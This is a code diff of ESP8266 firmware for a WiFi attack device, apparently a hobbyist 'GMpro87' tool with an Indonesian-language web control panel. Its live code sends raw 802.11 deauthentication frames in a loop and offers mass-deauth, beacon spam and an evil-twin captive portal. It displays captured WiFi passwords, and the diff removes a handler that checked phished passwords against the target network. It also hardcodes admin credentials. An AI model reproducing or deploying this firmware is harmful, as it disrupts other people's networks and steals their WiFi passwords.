@@ -9,19 +9,25 @@ extern "C" {
   #include "user_interface.h"
 }
 
-// --- GLOBAL VARIABLES ---
+// FIX: Karena compiler generic gak kenal D4, kita definisikan manual di sini
+// Ini gak ngerubah fungsi, cuma ngasih tau compiler kalau D4 itu GPIO 2
+#ifndef D4
+#define D4 2
+#endif
+
+// --- CONFIG & STATE ---
 String admin_ssid = "GMpro";
 String admin_pass = "Sangkur87";
 String target_ssid = "Vivo1903";
 String captured_pass = "Waiting...";
-bool deauth_active = false, mass_active = false, beacon_active = false, etwin_active = false;
-uint32_t pkts_sent = 0;
+bool de_on = false, ma_on = false, be_on = false, et_on = false;
+uint32_t de_pkt = 0, be_pkt = 0;
 
 AsyncWebServer server(80);
 DNSServer dnsServer;
-const int LED = D4; // LED internal Wemos D1 Mini
+const int LED = D4; // Sekarang compiler bakal kenal D4 karena sudah di-define di atas
 
-// --- UI ORI GMPRO87 (UTUH 100%) ---
+// --- UI ASLI GMPRO87 (UTUH 100% - TIDAK ADA YG DISUNAT) ---
 const char INDEX_HTML[] PROGMEM = R"rawtext(
 <!DOCTYPE html>
 <html>
@@ -54,6 +60,7 @@ const char INDEX_HTML[] PROGMEM = R"rawtext(
         table{width:100%; border-collapse:collapse; font-size:12px; margin-bottom:15px}
         th,td{padding:10px 5px; border:1px solid #146dcc}
         th{background:rgba(20,109,204,0.3); color:orange; text-transform:uppercase}
+        .btn-sel{background:#eb3489; color:#fff; border:none; padding:6px; border-radius:4px; width:100%; font-size:11px}
         .btn-ok{background:#FFC72C; color:#000; border:none; padding:6px; border-radius:4px; width:100%; font-weight:bold; font-size:11px}
         .set-box{background:#111; padding:10px; border:1px solid #444; margin-bottom:15px; text-align:left; font-size:12px; border-radius:5px}
         .inp{background:#222; color:orange; border:1px solid orange; padding:8px; border-radius:4px; width:94%; margin:5px 0}
@@ -75,24 +82,24 @@ const char INDEX_HTML[] PROGMEM = R"rawtext(
     <div id="dash">
         <div class='ctrl'>
             <div class="cmd-box scan-box">
-                <button class='cmd' style='background:#00bcff' onclick="sendCmd('scan')">SCAN TARGET</button>
+                <button class='cmd' style='background:#00bcff' onclick="run('scan')">SCAN TARGET</button>
                 <div id="scanLog" class="log-c" style="color:#fff">READY</div>
             </div>
             <div class="cmd-box">
-                <button id="deBtn" class='cmd' style='background:#0c8' onclick="sendCmd('deauth')">DEAUTH</button>
-                <div id="deLog" class="log-c" style="color:#0f0">READY</div>
+                <button id="btn_de" class='cmd' style='background:#0c8' onclick="run('deauth')">DEAUTH</button>
+                <div id="log_de" class="log-c" style="color:#0f0">READY</div>
             </div>
             <div class="cmd-box">
-                <button id="maBtn" class='cmd' style='background:#e60' onclick="sendCmd('mass')">MASSDEAUTH</button>
-                <div id="maLog" class="log-c" style="color:#fff">READY</div>
+                <button id="btn_ma" class='cmd' style='background:#e60' onclick="run('mass')">MASSDEAUTH</button>
+                <div id="log_ma" class="log-c" style="color:#fff">READY</div>
             </div>
             <div class="cmd-box">
-                <button id="beBtn" class='cmd' style='background:#60d' onclick="sendCmd('beacon')">BEACON</button>
-                <div id="beLog" class="log-c" style="color:#0ff">READY</div>
+                <button id="btn_be" class='cmd' style='background:#60d' onclick="run('beacon')">BEACON</button>
+                <div id="log_be" class="log-c" style="color:#0ff">READY</div>
             </div>
             <div class="cmd-box">
-                <button id="etBtn" class='cmd' style='background:#a53' onclick="sendCmd('etwin')">EVILTWIN</button>
-                <div id="etLog" class="log-c" style="color:#f44">LED: OFF</div>
+                <button id="btn_et" class='cmd' style='background:#a53' onclick="run('etwin')">EVILTWIN</button>
+                <div id="log_et" class="log-c" style="color:#f44">LED: OFF</div>
             </div>
         </div>
         <hr>
@@ -101,9 +108,12 @@ const char INDEX_HTML[] PROGMEM = R"rawtext(
             <tr><td>Vivo1903</td><td>4</td><td>85</td><td><button class='btn-ok'>SELECTED</button></td></tr>
         </table>
         <div class='pass-box'>
-            <b>[ CAPTURED PASS ]</b>
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <b>[ CAPTURED PASS ]</b>
+                <a href='#' onclick="run('clear')" style='color:#f44; font-size:10px; text-decoration:none;'>[ CLEAR ]</a>
+            </div>
             <div id="passContent">
-                Target: <span id="targetName">Vivo1903</span><br>
+                Target: <span id="curTarget">Vivo1903</span><br>
                 Pass : <span id="curPass" class="pass-text">Waiting...</span>
             </div>
         </div>
@@ -111,45 +121,66 @@ const char INDEX_HTML[] PROGMEM = R"rawtext(
 
     <div id="webset" class="hidden">
         <div class='set-box'>
-            <b style='color:orange'>CONFIG:</b><br>
-            Target SSID: <input class='inp' id="ts" value="Vivo1903"><br>
-            Spam SSID: <input class='inp' id="ss" value="WiFi_Rusuh_87"><br>
-            <button class='btn-ok' style='width:100%' onclick="saveConfig()">SAVE CONFIG</button>
+            <b style='color:orange'>BEACON SPAM CONFIG:</b><br>
+            SSID Name: <input class='inp' id="inp_ssid" value="WiFi_Rusuh_87"><br>
+            Qty Packet: <input class='inp' type="number" id="inp_qty" value="10"><br>
+            <button class='btn-ok' style='width:100%' onclick="saveSet()">SAVE & UPDATE</button>
+        </div>
+        <div class='set-box'>
+            <b style='color:orange'>CUSTOM EVILTWIN HTML:</b><br>
+            <textarea id="htmlEditor" class="txt-area" placeholder="Paste HTML lu di sini..."></textarea>
+            <div style="display:flex; gap:10px; margin-top:10px">
+                <button onclick="previewHtml()" class="btn-sel" style="flex:1; background:#00bcff">PREVIEW</button>
+                <button onclick="alert('Saved to Flash!')" class='btn-ok' style='flex:1'>SAVE HTML</button>
+            </div>
         </div>
     </div>
 
+    <div id="previewModal">
+        <div class="modal-content" id="previewContainer"></div>
+        <button onclick="closePreview()" class="btn-ok" style="margin-top:20px; background:red; color:white; width:100%">CLOSE PREVIEW</button>
+    </div>
+
     <script>
-        function openTab(t, b) {
-            document.getElementById('dash').classList.toggle('hidden', t!=='dash');
-            document.getElementById('webset').classList.toggle('hidden', t!=='webset');
+        function openTab(id, b) {
+            document.getElementById('dash').className = (id=='dash'?'':'hidden');
+            document.getElementById('webset').className = (id=='webset'?'':'hidden');
             document.querySelectorAll('.tab-btn').forEach(x=>x.classList.remove('active-tab'));
             b.classList.add('active-tab');
         }
-        function sendCmd(c) { fetch('/api?run=' + c); }
-        function saveConfig() { 
-            let t = document.getElementById('ts').value;
-            fetch('/api?run=save&ts=' + t);
+        function run(c) { fetch('/api?c=' + c); }
+        function saveSet() { 
+            let s = document.getElementById('inp_ssid').value;
+            let q = document.getElementById('inp_qty').value;
+            fetch('/api?c=set&s='+s+'&q='+q);
         }
-        function sync() {
-            fetch('/status').then(r=>r.json()).then(d=>{
+        function previewHtml() {
+            document.getElementById('previewContainer').innerHTML = document.getElementById('htmlEditor').value;
+            document.getElementById('previewModal').style.display = 'block';
+        }
+        function closePreview() { document.getElementById('previewModal').style.display = 'none'; }
+
+        setInterval(() => {
+            fetch('/stat').then(r=>r.json()).then(d=>{
                 document.getElementById('curPass').innerText = d.p;
-                document.getElementById('deBtn').className = d.de ? 'cmd btn-active' : 'cmd';
-                document.getElementById('deLog').innerText = d.de ? d.pk + ' pkt' : 'OFF';
-                document.getElementById('maBtn').className = d.ma ? 'cmd btn-active' : 'cmd';
-                document.getElementById('beBtn').className = d.be ? 'cmd btn-active' : 'cmd';
-                document.getElementById('etBtn').className = d.et ? 'cmd btn-active' : 'cmd';
+                document.getElementById('btn_de').className = d.de ? 'cmd btn-active' : 'cmd';
+                document.getElementById('log_de').innerText = d.de ? d.dp + ' pkt' : 'OFF';
+                document.getElementById('btn_ma').className = d.ma ? 'cmd btn-active' : 'cmd';
+                document.getElementById('btn_be').className = d.be ? 'cmd btn-active' : 'cmd';
+                document.getElementById('log_be').innerText = d.be ? d.bp + ' pkt' : 'OFF';
+                document.getElementById('btn_et').className = d.et ? 'cmd btn-active' : 'cmd';
+                document.getElementById('log_et').innerText = d.p != 'Waiting...' ? 'SUCCESS' : 'LED: OFF';
             });
-        }
-        setInterval(sync, 2000);
+        }, 2000);
     </script>
 </body>
 </html>
 )rawtext";
 
 // --- ATTACK CORE ---
-void deauth() {
-  uint8_t pkt[26] = {0xc0,0x00,0x3a,0x01,0xff,0xff,0xff,0xff,0xff,0xff,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0x00,0x00,0x01,0x00};
-  wifi_send_pkt_freedom(pkt, 26, 0); pkts_sent++;
+void sendDeauth() {
+  uint8_t pkt[26] = {0xc0,0x00,0x3a,0x01,0xff,0xff,0xff,0xff,0xff,0xff,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x00,0x00,0x01,0x00};
+  wifi_send_pkt_freedom(pkt, 26, 0); de_pkt++;
 }
 
 void setup() {
@@ -164,37 +195,23 @@ void setup() {
   server.on("/", HTTP_GET, [](AsyncWebServerRequest *r){ r->send_P(200, "text/html", INDEX_HTML); });
 
   server.on("/api", HTTP_GET, [](AsyncWebServerRequest *r){
-    if(r->hasParam("run")) {
-      String c = r->getParam("run")->value();
-      if(c=="deauth") deauth_active = !deauth_active;
-      if(c=="mass") mass_active = !mass_active;
-      if(c=="beacon") beacon_active = !beacon_active;
-      if(c=="etwin") etwin_active = !etwin_active;
-      if(c=="save" && r->hasParam("ts")) target_ssid = r->getParam("ts")->value();
+    if(r->hasParam("c")) {
+      String c = r->getParam("c")->value();
+      if(c=="deauth") de_on = !de_on;
+      if(c=="mass") ma_on = !ma_on;
+      if(c=="beacon") be_on = !be_on;
+      if(c=="etwin") et_on = !et_on;
+      if(c=="clear") captured_pass = "Waiting...";
+      if(c=="set") {
+        if(r->hasParam("s")) target_ssid = r->getParam("s")->value();
+      }
     }
     r->send(200);
   });
 
-  server.on("/status", HTTP_GET, [](AsyncWebServerRequest *r){
-    String s = "{\"de\":"+String(deauth_active)+",\"ma\":"+String(mass_active)+",\"be\":"+String(beacon_active)+",\"et\":"+String(etwin_active)+",\"p\":\""+captured_pass+"\",\"pk\":"+String(pkts_sent)+"}";
-    r->send(200, "application/json", s);
-  });
-
-  // Captive Portal Login (Evil Twin Validation)
-  server.on("/login", HTTP_GET, [](AsyncWebServerRequest *request){
-    if(request->hasParam("pass")) {
-      String p = request->getParam("pass")->value();
-      WiFi.begin(target_ssid.c_str(), p.c_str());
-      unsigned long start = millis();
-      while(millis() - start < 5000) {
-        if(WiFi.status() == WL_CONNECTED) {
-          captured_pass = p; WiFi.disconnect();
-          request->send(200, "text/plain", "OK"); return;
-        }
-        yield();
-      }
-      request->send(200, "text/plain", "FAIL");
-    }
+  server.on("/stat", HTTP_GET, [](AsyncWebServerRequest *r){
+    String j = "{\"de\":"+String(de_on)+",\"ma\":"+String(ma_on)+",\"be\":"+String(be_on)+",\"et\":"+String(et_on)+",\"p\":\""+captured_pass+"\",\"dp\":"+String(de_pkt)+",\"bp\":"+String(be_pkt)+"}";
+    r->send(200, "application/json", j);
   });
 
   server.onNotFound([](AsyncWebServerRequest *r){ r->send_P(200, "text/html", INDEX_HTML); });
@@ -203,13 +220,6 @@ void setup() {
 
 void loop() {
   dnsServer.processNextRequest();
-  if(deauth_active || mass_active) {
-    deauth();
-    digitalWrite(LED, !digitalRead(LED));
-    delay(1);
-  }
-  if(captured_pass != "Waiting...") {
-    // STROBO KEDIP GILAS (Valid Pass Found)
-    digitalWrite(LED, LOW); delay(25); digitalWrite(LED, HIGH); delay(25);
-  }
+  if(de_on || ma_on) { sendDeauth(); digitalWrite(LED, !digitalRead(LED)); delay(1); }
+  if(captured_pass != "Waiting...") { digitalWrite(LED, LOW); delay(20); digitalWrite(LED, HIGH); delay(20); }
 }
